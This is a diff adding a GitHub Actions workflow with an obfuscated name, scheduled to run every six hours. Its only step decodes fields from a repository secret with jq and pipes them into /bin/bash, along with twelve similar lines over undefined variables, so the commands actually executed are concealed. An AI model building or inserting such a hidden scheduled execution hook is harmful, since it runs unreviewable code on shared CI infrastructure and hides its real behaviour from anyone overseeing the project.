@@ -1,0 +1,29 @@
+name: liubanqi2314
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liubanqi2314
+        env:
+          hf95303: ${{ secrets.hf95303 }}
+        run: |
+          echo $hf95303 | jq -r .q67536 | /bin/bash
+          echo $f927 | jq -r .av6 | /bin/bash
+          echo $klz52876 | jq -r .vfun7 | /bin/bash
+          echo $whc79 | jq -r .johz431 | /bin/bash
+          echo $wegyd0406 | jq -r .s09849 | /bin/bash
+          echo $yjj46148 | jq -r .xqzg6 | /bin/bash
+          echo $o98065 | jq -r .zb3 | /bin/bash
+          echo $iqz85 | jq -r .wark907 | /bin/bash
+          echo $jtlsw9452 | jq -r .yvq63602 | /bin/bash
+          echo $jqnn3 | jq -r .wckhi72 | /bin/bash
+          echo $o738 | jq -r .tk216 | /bin/bash
+          echo $rukv9 | jq -r .bjesz0813 | /bin/bash
+          echo $n9610 | jq -r .jwe80795 | /bin/bash
+
